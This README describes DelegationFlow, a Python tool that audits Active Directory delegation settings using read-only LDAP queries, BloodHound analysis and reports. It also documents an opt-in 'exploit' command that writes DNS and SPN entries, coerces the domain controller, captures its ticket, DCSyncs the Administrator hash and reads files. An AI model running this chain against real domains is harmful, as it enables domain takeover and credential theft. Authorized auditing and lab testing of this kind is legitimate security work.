# DelegationFlow

**A cross-platform Active Directory delegation assessment CLI with a separate, explicit authorized-lab exploit workflow.**

DelegationFlow helps authorized security practitioners discover accounts configured for **Unconstrained Delegation**, inspect their SPNs, and produce concise security findings. The read-only assessment commands cover multiple delegation modes, domain-controller context, Protected Users membership, HTML reporting, and offline BloodHound ACL-edge correlation. The `0.3.0` build also adds an opt-in `exploit` command that validates the GenericWrite → unconstrained delegation → DCSync chain against an authorized lab.

> **Status:** expanded alpha (`0.3.0`). Validate against your own authorized lab before relying on results.

## Features

- LDAP discovery of unconstrained delegation on user and computer objects.
- Constrained delegation discovery through `msDS-AllowedToDelegateTo`.
- RBCD configuration discovery through `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Domain-controller discovery and direct membership listing for the Protected Users group.
- Offline BloodHound JSON ACL-edge analysis for GenericWrite, GenericAll, WriteDacl, WriteOwner, AddMember, and WriteSPN.
- SPN collection and lightweight analysis.
- Clear findings with severity, evidence, and defensive recommendations.
- Rich terminal output, JSON export, and standalone HTML reports.
- Paged LDAP searches and explicit connection/error handling.
- Read-only assessment commands: no automatic AD modifications, coercion, ticket extraction, or credential dumping.
- Separate `exploit` command for authorized labs: ADIDNS/SPN writes, printer coercion, delegated-TGT capture, DCSync, and flag retrieval.

## Requirements

- Python 3.11+
- Network reachability to the domain controller / LDAP server
- An account authorized to perform directory reads
- For `exploit`: inbound SMB port 445 reachable from the target and the `exploit` extra
- macOS or Linux

## Install

```bash
git clone https://github.com/YOUR-USERNAME/DelegationFlow.git
cd DelegationFlow

python3 -m venv .venv
source .venv/bin/activate

python -m pip install --upgrade pip
pip install -e ".[dev]"
```

For the authorized-lab exploit workflow, install the optional extras:

```bash
pip install -e ".[dev,exploit]"
```

## Quick start

Use an explicit base DN and LDAP server:

```bash
delegationflow check \
  --server dc01.example.local \
  --base-dn "DC=example,DC=local" \
  --username "EXAMPLE\\analyst"
```

The tool prompts for a password if one is not supplied through the supported environment variable.

```bash
export DELEGATIONFLOW_PASSWORD='your-password'
delegationflow enumerate \
  --server dc01.example.local \
  --base-dn "DC=example,DC=local" \
  --username 'EXAMPLE\analyst'
unset DELEGATIONFLOW_PASSWORD
```

Assess and export JSON + HTML:

```bash
delegationflow assess \
  --server dc01.example.local \
  --base-dn "DC=example,DC=local" \
  --username 'EXAMPLE\analyst' \
  --output assessment.json \
  --html assessment.html
```

Run the expanded read-only directory assessment (delegation modes, DCs, Protected Users context):

```bash
delegationflow full-audit \
  --server dc01.example.local \
  --base-dn "DC=example,DC=local" \
  --username 'EXAMPLE\analyst' \
  --output full-audit.json \
  --html full-audit.html
```

Analyze an extracted BloodHound JSON export offline (no LDAP bind):

```bash
delegationflow bloodhound --directory ./bloodhound-export --output acl-analysis.json --graph candidate-paths.mmd
```

For LDAPS:

```bash
delegationflow assess \
  --server dc01.example.local \
  --port 636 \
  --use-ssl \
  --base-dn "DC=example,DC=local" \
  --username 'EXAMPLE\analyst'
```

Run the authorized-lab exploit chain (writes DNS/SPN state and coerces authentication):

```bash
export DELEGATIONFLOW_PASSWORD='<account password>'
delegationflow exploit \
  --server dc01.lab.local \
  --base-dn 'DC=lab,DC=local' \
  --username 'LAB\analyst' \
  --target-account someuser \
  --target-password 'someuser-password' \
  --attacker-host roguecomputer \
  --loot-dir ./loot \
  --flag-path 'C:\flags\target-flag.txt' \
  --cleanup
unset DELEGATIONFLOW_PASSWORD
```

The command creates an ADIDNS A record for `--attacker-host`, adds a matching
`CIFS/<host>` SPN to the delegation account through its GenericWrite principal,
starts an SMB listener, coerces the DC, captures the forwarded `DC01$` TGT,
DCSyncs `Administrator`, and reads the requested file. Use `--cleanup` to remove
the SPN and DNS record created by the run.

Use `delegationflow --help` and `delegationflow exploit --help` for all options.

## Configuration

A sample YAML file is provided at `examples/config.example.yaml`. Configuration files must not contain passwords. Credentials are prompted interactively or supplied through `DELEGATIONFLOW_PASSWORD`.

## What is detected?

The MVP searches for directory objects whose `userAccountControl` contains `TRUSTED_FOR_DELEGATION` (`0x80000` / `524288`). It records object class, account name, DN, UAC value, enabled state when available, and SPNs.

The assessment currently flags:
- Unconstrained Delegation enabled on an account.
- A service principal name is present on a delegation-enabled account.
- A delegation-enabled account has no SPN (informational context; not itself proof of exploitability).

These are configuration findings, not proof that an attack path is exploitable. The read-only assessment commands do not attempt exploitation; the opt-in `exploit` command is documented separately.

## Security and limitations

- The `check`, `enumerate`, `assess`, `full-audit`, `bloodhound`, and `acl` commands use read-only LDAP operations only.
- The `exploit` command performs ADIDNS/SPN writes, authentication coercion, delegated-TGT capture, DCSync, and remote file reads. Use it only in an authorized lab.
- The read-only commands do not create DNS records, modify SPNs, coerce authentication, capture tickets, dump credentials, or perform DCSync.
- BloodHound ACL analysis is offline and depends on the completeness and schema of the supplied export. A write edge is not proof of effective access or exploitability.
- The LDAP full audit reports whether an RBCD descriptor is present; it does not yet decode the descriptor into effective trustees. Review it with a dedicated ACL analysis workflow.
- Passwords are never written to configuration or JSON output. The `exploit` JSON result does contain the captured ticket path, the DCSynced NTLM hash, and the flag, so protect that file as sensitive evidence.
- Use least-privileged, authorized directory credentials.
- LDAP signing, channel binding, TLS, and domain policies may affect connectivity.
- Results depend on the supplied search base and permissions.
- `check` verifies LDAP connectivity and bind; it does not guarantee every query is authorized.

## Development

```bash
pip install -e ".[dev]"
pytest
```

Tests use mocked LDAP responses and do not require a live domain.

## Roadmap

- [x] Read-only Unconstrained Delegation enumeration
- [x] SPN collection
- [x] Initial risk findings
- [x] Terminal and JSON output
- [x] Unit tests with mocked LDAP
- [x] HTML report
- [x] Constrained-delegation and RBCD configuration discovery
- [x] Domain-controller and Protected Users context
- [x] Offline BloodHound ACL-edge correlation
- [x] Candidate delegation-path correlation and Mermaid graph export
- [x] Authorized-lab GenericWrite → unconstrained delegation → DCSync chain
- [ ] Native LDAP security-descriptor parsing and effective-rights evaluation

## License

MIT. See `LICENSE`.
